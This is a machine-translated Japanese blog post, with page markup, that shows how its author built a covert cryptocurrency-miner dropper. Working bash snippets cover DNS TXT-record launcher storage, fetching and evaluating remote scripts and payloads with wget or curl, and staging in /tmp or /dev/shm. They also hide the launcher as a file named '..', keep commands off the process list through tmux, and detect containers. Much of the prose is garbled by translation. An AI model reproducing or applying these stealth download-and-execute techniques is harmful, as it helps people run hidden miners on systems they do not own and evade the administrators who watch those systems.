-amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><link href=https://www.unto.re/ja/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> クリプトノートドロッパーのクロニクル</title><script type=application/ld+json>{"url":"/ja/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/ja/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-10-24T20:47:52.543","inLanguage":"ja","name":"","mainEntityOfPage":{"@id":"/ja/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/ja/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/ja/posts/><i class="fas fa-pen menu-icons"></i> 投稿</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/ja/media/><i class="fas fa-tv menu-icons"></i> メディア</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/ja/posts/><i class="fas fa-pen menu-icons"></i> 投稿</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/ja/media/><i class="fas fa-tv menu-icons"></i> メディア</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/ja/posts/chronichles_of_a_cryptonote_dropper> クリプトノートドロッパーのクロニクル</a></h1><blockquote id=page-description style=font-style:italic>...どこまで進んで...ペニー？</blockquote></div><div class=franklin-content><p>あなたが採掘したいと仮定します<a href=https://en.wikipedia.org/wiki/Cryptocurrency> 暗号通貨</a> リモートで<em> バーチャル</em> ハードウェア。あなたは私のものを見つける必要があります。リモートサーバーとは、<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> アシックス</a> またはGPUプルーフオブワークアルゴリズム、基本的にのみ<a href=\posts/a-few-notes-on-proof-of-work> CPUに優しいコイン</a>.<h2 id=the_software><a class=header-anchor href=#the_software> ソフトウェア</a></h2><p>検索して見つける<a href=https://github.com/xmrig/xmrig> 鉱夫</a> 、しかしそれは本当にいいことではありません、あなたはあなたがリモートからよりよく制御できる何かが欲しいので、あなたは見つけます<a href=https://github.com/Bendr0id/xmrigCC> 別の鉱夫</a> 。あなたはまた欲しい<a href=https://github.com/Bendr0id/xmrigcc-proxy> プロキシー</a> 、多くの接続は短命になるので、あなたはしたくない<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> あなたのマイニングプール。また、<a href=https://github.com/search?q=tunnel> トンネル</a> いいだろう。<h2 id=the_design><a class=header-anchor href=#the_design> デザイン</a></h2><p>一部のボットネットは、ブロックチェーンデータを使用してコマンドを検索します。<a href=https://twitter.com/sarahjamielewis> 誰か</a> また持っているようです<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> 負けた賭け</a> これが二度と起こらないことについて...とにかく私たちはそれほど洗練されていませんが、一時ディレクトリで自己解凍するペイロードをプルするスクリプトを格納するいくつかのDNSレコードでうまくいきます<em> ほとんど</em> その設定の痕跡はありません。これは構造を描いた小さなフローチャートです<h2 id=launcher><a class=header-anchor href=#launcher> ランチャー</a></h2><p>起動スクリプトのポイントは、時間のテストに耐えられるように、アクセス可能で簡単に更新できることです。更新<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> レコードは簡単で、DNSはネットワーク内でシャットダウンされる最後のものです。IPアドレスを覚えるのが難しいためです...したがって、ほとんどの場合、DNSが利用可能になる可能性があります。あなたは私たちがいつ<em> 展開スクリプトのフェッチ</em>実際にはすでにいくつかのロジックを実行しています。これはランチャースクリプトです。レコードを検索するためにDNSクエリを実行する機能が必要です。DNSはどこにでもある可能性がありますが<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> 掘る</a> ではありません。<p>別のツールをダウンロードする必要がある場合、ここには少し難問があります<em> 別のスクリプトをダウンロードしてペイロードをダウンロードする</em> ペイロードをダウンロードするだけです！防衛のために...このスクリプトダンスを行うと難読化が増し、ランチャーの実装を1つだけ維持でき（保守性、イェーイ）、ほとんどの場合必要ありません。<a href=https://en.wikipedia.org/wiki/Standalone_program> 静的にリンク</a> セルフホスティングまたはクラウドホスティングのいずれかによってフェッチされたDNSクエリを実行するための実行可能ファイルを掘ります（クラウドサービスには最小限の空き帯域幅があり、Cookieまたはアクセストークンも必要とするため、3または4のようなフォールバックがあります...それらは非常にスクリプトですもちろん、友好的ではなく、意図的にそうです）。<p>DNSレコードには何がありますか？使用しています<a href=https://en.wikipedia.org/wiki/TXT_record> txt</a> カスタムドメインでのレコード（ここでもフォールバック）。なぜTXT？それらはたまたま最大量のデータを保存できるものです..通常それは一種であるため<a href=https://www.ietf.org/rfc/rfc6763.txt> おすすめされた</a> 応じて<em> もの</em> 。特に使用しています<a href=https://www.cloudflare.com/> cloudflare</a> DNSは無料なので、いじくり回していて、町でほとんど唯一のプレーヤーです（<em> まあ実際にはそうではありませんが、他の代替の淡い機能は賢明です</em> ）。複数のデータをに保存できる場合があります<em> 同じ</em> 記録...これはいくつかの仕様について混乱し、スクランブルをかけ始めます...（接線）Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> 慣れている</a> 許可する<em> 連鎖</em>TXTレコードは合計で約9kバイト、ドキュメントには現在約2kバイトと記載されていますが、変更前は約6kを使用していて、圧縮せずにスクリプトを提供していました。その後、スクリプトを間引いて事前に圧縮する必要がありました（実際にはを使用しようとしました<a href=https://freedns.afraid.org/> freedns</a> プロバイダー、私は1日以内に禁止されました、彼らは厳格な無脂肪TXTレコードポリシーを持っていると推測しました）、しかしgzip圧縮はパイプフレンドリーではなく、それでも問題を引き起こしていたので、圧縮せずにスクリプトを詰め込む必要がありました（エンドタンジェント）。<p>どうやって保管しますか？ TXTレコードは英数字の文字列のみをサポートします。<a href=https://en.wikipedia.org/wiki/Null_character> NUL</a> 、したがって、null以外のエンコーディングにラップする必要があります。<a href=https://en.wikipedia.org/wiki/Base64> base64</a> この制約を満たし、保存しているため<em> 連鎖</em> TXTレコード、出力をチャンク化する必要があります。シェルのものを使用しているため、これは<code>-w</code> フラグ、busyboxでは、このようなフラグは以前のバージョンでは存在しなかった（またはオプトインした）ので面倒でしたが、別の方法として、opensslにバンドルされているエンコーダーを使用することもできます。<code>openssl enc -base64</code>.<p>デプロイメントスクリプトを保存する方法がわかったので、どちらかを使用して保存します。<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> または手動で。どうやって引っ張るの？ bindutilsまたは独自のものが必要だと述べました<code>dig</code> ...サービングエンドポイントを選択した後、ダウンロードしたいのですが、通常は利用可能なものがあります<a href=https://www.gnu.org/software/wget/> wget</a> また<a href=https://curl.se/> カール</a> 、wgetはプリインストールされていることがはるかに多いですが、busyboxはダイナミックライブラリでのみtlsサポートを提供するため、エンドポイントがhttpを提供しているか、ユーティリティが<code>wget</code> gnu-utilsから<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>それは試してみることを意味します<code>-t2</code> 待つ時間<code>-T10</code> 秒であること<code>-q</code> からの静かな読書<code>-i-</code> stdin（<code>$digurl</code> ）と書き込み<code>-O-</code> stdout（<code>$filename</code>）。このコマンドは、ダウンロードしているものを一目で明らかにするものではありません。同じ理由で他のシェルコマンドに非常に注意するか、シェルに固執します（<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bash</a> ）可能な場合は組み込み。実行可能ファイルをダウンロードする場所にも注意してください。特にコンテナや<code>tmp</code> パスは<code>noexec</code> 。 DNSクエリツールができたので、レコードをフェッチします<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>フラグはここでは自明です、<code>+short</code> データ自体にのみ関心があるため、出力を解析する必要がないことを意味します。グーグルのようにDNSサーバーを指定することが重要です（<code>8.8.8.8</code> ）またはcloudflare（<code>1.1.1.1</code> ）多くの環境がデフォルトで独自のDNSサーバーにDNSクエリをリダイレクトまたはプロキシするためのもの。チャンク化されたスクリプトをフェッチした後、デコードの準備をするために引用符と空白を処理します<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>今私たちが<em> まだ</em> ランチャーをお持ちではありませんか？ DNSは厄介です。フォールバックが必要です。サブドメインを設定して、ランチャースクリプトを直接フェッチします。スクリプトを評価する前に、いくつかの変数を使用してスクリプトをカスタマイズします。ここでも、TXTレコードを使用して、変数のNAME = VALUEリストを格納して解析します。変数のフォールバックもあり、cloudflareはURLに基​​づいてリダイレクトを提供し、これらのリダイレクトは提供されます<em> 前</em> 宛先なので、エンドポイントは必要ありません。架空のエンドポイントへの正規表現ベースのリダイレクトルールを構成するだけです。関心があるのはURLのパラメーターです。<code>?NAME=VALUE&NAME2=VALUE2...</code>、リダイレクトURLを変更するだけでランチャーをパラメーター化できるように、常に引用符とエスケープコードに注意を払います<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>wget<code>-S</code> 解析のために関心のあるリダイレクトURLを出力します。パラメータとスクリプトを用意して、ファイルに書き込む変数を評価します<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>このファイルは、デプロイスクリプトによって提供されます。起動スクリプトの最後の部分は実際のものです<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> トランポリン</a> 、現在のシェルプロセス内でスクリプトを評価するか、可能であればtmuxでスクリプトを管理できるようにします。<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>ランチャースクリプトは「..」という名前のファイルにダンプされます。これは、<em> 親</em> ディレクトリ。また、プロセスコマンドに残るため、セッションコマンドは含めません。代わりに、事前にtmuxセッションを開始し、tmuxターミナルインターフェイスを介してソースコマンドを送信します。これに関連して、実行可能ファイルを呼び出すことがあります<code>./</code> これらの文字をコマンドに保持するため、を追加することをお勧めします<code>$PWD</code> パスへ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> ペイロード</a></h2><p>デプロイスクリプトは、<code>env.sh</code> ファイル、および変数を次のように保持または構成します<code>STARTING_*</code> のような変数<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>これにより、環境をリセットしながら、実行中のインスタンスを強制終了して再起動できます。 exec機能を備えたtmpディレクトリに切り替えましょう<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>内にあるかどうかを確認する<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> 容器</a> また便利です、ヒントのためにファイルシステムを精査することができます<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>ペイロードをダウンロードするときが来ました。wgetとcurlの両方をサポートすることを選択しました。注意深いフラグを使用してwgetを使用する方法はすでに知っています。curlの場合は少し異なります。設定ファイルを作成し、オーバーライドする必要があります<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>最後のステップは、ペイロードを抽出することです<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>ペイロードを処理するための[CDN]の使用について言及する価値があります。ここでも、クラウドフレアが救助につながるため、帯域幅の消費から私たちを救うことができます。圧縮されたペイロードの名前を<em> ファイル拡張子</em> cloudflareでサポートされています...キャッシュされます。 Cloudflareは、サービスを提供しているもののヘッダーをチェックしません。おそらく、その規模でチェックするのは実際的ではないためです。<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> バッシュランドを下る冒険</a></h2><p>Bashは、移植性があり、見た目が悪くなく、perl、ruby、pythonなどの他のスクリプト言語と比較してユビキタスであるという前提で選択されました。真実は、golangまたはluaで記述されたスタンドアロンのバイナリははるかに簡単で、バグが少なく、保守も簡単だったでしょう。基本的に、bashで非常に多くのかゆみを掻いたときまでに、bashは可能な限り最悪の選択でした。 、書き直すには遅すぎて、退屈にもなりました。<p>コンパイル時フラグとともにbusyboxを使用して、すべてのビルトイン（grepやsedなど）を使用するオプションもありましたが、この方法でビルトインを使用すると、ジョブ（フォーク）を生成できず、デーモンが潜在的なデッドロックにさらされます。<p>ここでは、いくつかのbash関数について説明し、完全なリストを利用できます。<a href=\assets/posts/bash_functions.txt> ここ</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>使用<code>RANDOM</code> 文字コードに対応する97〜122の数値を取得する変数。printfは組み込みである必要があり、ループ内でフォークする必要はありません。<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>パイプを利用して匿名のファイル記述子を作成します。これらはファイル記述子とまったく同じようには動作しませんが、<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>フォークなしでスリープし、組み込みの読み取りのタイムアウト機能を悪用することにより、専用のファイル記述子を使用し、終了を回避するために使用可能であることを確認する必要があります。<p>のような機能があります<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> システムの使用状況を監視するために使用され、これらはすべてLinuxを利用します<code>/proc</code> のようなツールのないファイル<code>ps</code> 、フォークなし、すべて純粋なbash。<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>bash以降、コプロセスが利用可能です<code>v4</code> 、名前と独自のファイル記述子があることを除けば、ジョブに似ています。<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>デーモンを作成していますが、これは長寿命のプロセスであり、多くのファイル記述子を使用しています。実際には、発生を回避するためにいくつかのクリーンアップを実行したいと考えています。<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
